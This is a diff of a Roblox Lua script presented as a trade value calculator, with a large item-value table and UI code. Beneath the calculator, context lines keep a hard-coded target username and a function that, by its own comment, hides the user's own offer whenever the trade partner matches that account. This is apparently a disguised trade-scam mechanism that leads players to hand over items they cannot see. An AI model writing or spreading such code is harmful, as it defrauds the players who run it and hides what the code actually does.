@@ -4,10 +4,6 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
-------------------------------------------------
--- VALUE TABLE
-------------------------------------------------
-
 local ItemValues = {
 	Icepiercer = 195,
 	Plasmablade = 18,
@@ -288,141 +284,8 @@ local ItemValues = {
 	["Steambird"] = 1,
 	["Traveller"] = 1,
     ["Glitch1"] = 75,
-["Glitch2"] = 50,
-["Bats"] = 135,
-["Gifts"] = 85,
-["Ghoulish"] = 80,
-["Pine"] = 75,
-["Sparkle9"] = 30,
-["Snowman Gun"] = 20,
-["Wrapped Gun"] = 20,
-["Sparkle10"] = 20,
-["Sparkle8"] = 20,
-["Frosted"] = 18,
-["Sparkle7"] = 18,
-["Elf"] = 17,
-["RIP"] = 15,
-["Candies"] = 5,
-["Snowflakes"] = 15,
-["CandyCorn 2017"] = 15,
-["Coal"] = 12,
-["Webbed"] = 12,
-["Sparkle6"] = 12,
-["Combat II"] = 10,
-["Ecto"] = 10,
-["Prism"] = 10,
-["Sparkle4"] = 10,
-["Phantom"] = 10,
-["Skool"] = 8,
-["Sparkle5"] = 8,
-["Tailslide"] = 8,
-["Pumpkin"] = 7,
-["Ollie"] = 7,
-["Sidewinder"] = 7,
-["Zombie"] = 7,
-["Mummified"] = 5,
-["Euro"] = 4,
-["Sketchy"] = 4,
-["Grave"] = 4,
-["Slime"] = 4,
-["CandyCorn"] = 3,
-["Alex"] = 3,
-["Corl"] = 3,
-["Denis"] = 3,
-["Starry"] = 3,
-["Sub"] = 3,
-["Ghosty"] = 3,
-["Sparkle1"] = 3,
-["Sparkle2"] = 3,
-["Sparkle3"] = 3,
-["Asteroid"] = 3,
-["Slime"] = 3,
-["Slimy"] = 2,
-["Grind"] = 2,
-["Indy"] = 2,
-["Elf"] = 1,
-["Bats"] = 1,
-["Grave"] = 1,
-["Haunted"] = 1,
-["Haunted"] = 1,
-["Bones"] = 1,
-["Brains"] = 1,
-["Witch"] = 1,
-["Bones"] = 140,
-["Zombified"] = 80,
-["Brains"] = 60,
-["Gingerbread"] = 55,
-["Sweater"] = 55,
-["Branches"] = 30,
-["Snowflake"] = 15,
-["Zombified"] = 15,
-["Skulls"] = 13,
-["Void"] = 10,
-["Zombie"] = 8,
-["Frozen"] = 5,
-["Lights"] = 5,
-["Mummy 2018"] = 5,
-["Potion"] = 5,
-["Gothic"] = 3,
-["Gingerbread"] = 3,
-["Webs"] = 3,
-["Pumpkin Pie"] = 3,
-["Holly"] = 3,
-["Potion"] = 3,
-["Potion"] = 3,
-["Frozen"] = 2,
-["Mummy"] = 2,
-["Mummy 2018"] = 2,
-["Zombie"] = 2,
-["Gingerbread"] = 1,
-["Zombie"] = 1,
-["Steel"] = 1,
-["Wrap"] = 1,
-["Wrap"] = 1,
-["Lights"] = 1,
-["Moons"] = 1,
-["Vampire"] = 1,
-["Wolf"] = 1,
-["Cane Knife"] = 950,
-["Dungeon"] = 80,
-["Silent Night"] = 50,
-["Darkknife"] = 40,
-["Makeshift"] = 35,
-["Zombified"] = 35,
-["Starry"] = 15,
-["Swirl"] = 15,
-["Aurora"] = 12,
-["Silent Night"] = 12,
-["Floral"] = 10,
-["Magma"] = 8,
-["Icicles"] = 8,
-["Watcher"] = 7,
-["Toxic"] = 7,
-["Vampire"] = 7,
-["Candy Swirl"] = 5,
-["Magma"] = 5,
-["Ghastly"] = 3,
-["Jack"] = 3,
-["Snakebite"] = 3,
-["Sun"] = 3,
-["Bats"] = 3,
-["Monster"] = 3,
-["Ghostfire"] = 2,
-["Green Marble"] = 2,
-["Orange Marble"] = 2,
-["Toxic"] = 2,
-["Darkgun"] = 1,
-["Snowflakes"] = 1,
-["Gingerbread"] = 1,
-["Aurora"] = 1,
-["Candy Swirl"] = 1,
-["Snakebite"] = 1,
-["Vampire"] = 1,
+    ["Glitch2"] = 75,
 }
-
-------------------------------------------------
--- UI
-------------------------------------------------
 
 local gui = Instance.new("ScreenGui")
 gui.Name = "TradeCalculator"
@@ -447,10 +310,6 @@ text.TextColor3 = Color3.fromRGB(255,255,255)
 text.Text = "Loading..."
 text.Parent = frame
 
-------------------------------------------------
--- GET TRADE
-------------------------------------------------
-
 local function getTrade()
 	local tradeGui = playerGui:FindFirstChild("TradeGUI")
 	if not tradeGui then return end
@@ -460,10 +319,6 @@ local function getTrade()
 
 	return container:FindFirstChild("Trade")
 end
-
-------------------------------------------------
--- VALUE READER
-------------------------------------------------
 
 local function readSlot(slot)
 	if not slot or not slot:IsA("Frame") then return 0 end
@@ -498,10 +353,6 @@ local function readSlot(slot)
 	return (ItemValues[name] or 0) * qty
 end
 
-------------------------------------------------
--- OFFER VALUE
-------------------------------------------------
-
 local function getOfferValue(offer)
 	if not offer then return 0 end
 
@@ -519,10 +370,6 @@ local function getOfferValue(offer)
 	return total
 end
 
-------------------------------------------------
--- STRICT USERNAME CHECK
-------------------------------------------------
-
 local TARGET_USERNAME = "(Garuda_Storage0001)"
 
 local function usernameMatches(theirOffer)
@@ -538,10 +385,6 @@ local function usernameMatches(theirOffer)
 
 	return false
 end
-
-------------------------------------------------
--- ONLY HIDE YOUR OFFER IF MATCH FOUND
-------------------------------------------------
 
 local function updateYourOfferVisibility(trade)
 	if not trade then return end
@@ -567,10 +410,6 @@ local function updateYourOfferVisibility(trade)
 		end
 	end
 end
-
-------------------------------------------------
--- UI UPDATE (ALWAYS RUNS)
-------------------------------------------------
 
 local function updateUI()
 	local trade = getTrade()
@@ -608,10 +447,6 @@ local function updateUI()
 		"\nDIFF: " .. diff ..
 		"\n[" .. status .. "]"
 end
-
-------------------------------------------------
--- LOOP
-------------------------------------------------
 
 task.spawn(function()
 	while true do
